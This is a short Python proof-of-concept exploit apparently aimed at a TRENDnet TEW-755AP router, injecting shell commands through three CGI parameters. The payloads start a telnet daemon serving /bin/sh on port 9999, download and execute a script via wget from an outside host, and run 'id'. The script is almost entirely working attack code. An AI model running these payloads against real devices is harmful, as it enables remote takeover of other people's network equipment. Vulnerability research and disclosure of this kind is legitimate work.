#!/usr/bin/env python3
"""PoC: TEW-755AP cgi/ssi Command Injection | CWE-77 | CVSS 9.8"""
import requests, sys
T=sys.argv[1] if len(sys.argv)>1 else "192.168.10.1"
for n,p,d in [("auth_passwd","/cgi-bin/setup.cgi",{"auth_passwd":"x;telnetd -p 9999 -l /bin/sh;#"}),("log_email","/cgi-bin/email.cgi",{"log_email_server":"x;wget http://e/sh -O /tmp/sh;sh /tmp/sh;#"}),("wan_type","/cgi-bin/wan.cgi",{"wan_type":"static;id;#"})]:
    try:r=requests.post(f"http://{T}{p}",data=d,timeout=5);print(f"  {n}:{r.status_code}")
    except:print(f"  {n}: crashed")
print("[*] FirmRec: 18 vectors, 374 simexp hits")
